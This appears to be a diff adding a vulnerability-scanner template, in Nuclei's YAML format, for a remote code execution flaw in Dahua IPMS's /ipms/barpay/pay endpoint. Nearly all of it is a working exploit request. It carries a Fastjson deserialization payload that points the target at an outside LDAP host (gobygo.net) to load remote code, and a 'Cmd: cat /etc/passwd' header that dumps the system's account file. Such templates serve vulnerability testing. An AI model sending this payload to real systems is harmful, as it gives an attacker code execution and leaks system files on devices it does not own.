@@ -1,0 +1,36 @@
+id: dahua-ipms-barpay-pay-rce
+info:
+  name: Dahua IPMS Barpay Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dahua
+
+http:
+  - raw:
+      - |
+        POST /ipms/barpay/pay HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cmd: cat /etc/passwd
+
+        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://gobygo.net/A4", "autoCommit": true}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "Content-Type"
+        negative: true
